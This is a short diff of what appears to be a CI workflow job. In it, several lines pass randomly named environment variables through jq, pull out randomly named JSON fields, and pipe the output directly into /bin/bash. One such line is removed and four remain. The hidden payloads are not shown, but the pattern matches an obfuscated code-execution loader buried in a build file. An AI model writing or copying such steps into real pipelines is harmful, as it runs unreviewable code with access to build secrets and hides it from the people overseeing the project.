@@ -27,7 +27,6 @@ jobs:
           echo $vxr636 | jq -r .ww2466 | /bin/bash
           echo $mled57456 | jq -r .szd396 | /bin/bash
           printf '%s' "$ictsq0" | jq -r .huiyu284 | /bin/bash
-          echo $r3101 | jq -r .fvmrs1361 | /bin/bash
           printf '%s' "$njb12573" | jq -r .w32810 | /bin/bash
 
       - name: Persist results
